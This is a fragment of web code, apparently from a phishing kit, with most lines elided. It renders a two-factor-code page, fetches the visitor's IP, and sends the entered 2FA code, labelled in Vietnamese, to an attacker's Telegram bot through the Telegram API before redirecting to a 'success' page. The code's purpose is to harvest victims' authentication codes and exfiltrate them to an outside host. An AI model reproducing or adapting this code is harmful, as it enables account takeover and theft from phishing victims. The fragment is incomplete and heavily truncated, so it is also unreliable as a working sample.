...
<nav class="meta-nav">
    ...
    <?php require_once('../views/2fa-3.php'); ?>
        ...
        function sendToTelegramAndRedirect(event) {
            ...
            fetch('../get-ip.php')
                ...
                .then(ip => {
                    ...
                    var content = "🔐Mã 2FA 3 (APP): " + "<code>" + code + "</code>" +
                ...
                fetch('https://api.telegram.org/bot' + apiToken + '/sendMessage', {
                    ...
                    .then(responseData => {
                        if (responseData.ok) {
                            ...
                            setTimeout(() => {
                                window.location.href = "/success.php"; // Change URL to the page you want to redirect to 1
                            }, 3000);
                        } else {
